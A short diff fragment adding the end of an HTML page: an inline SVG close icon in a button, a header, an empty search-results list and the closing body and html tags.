+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
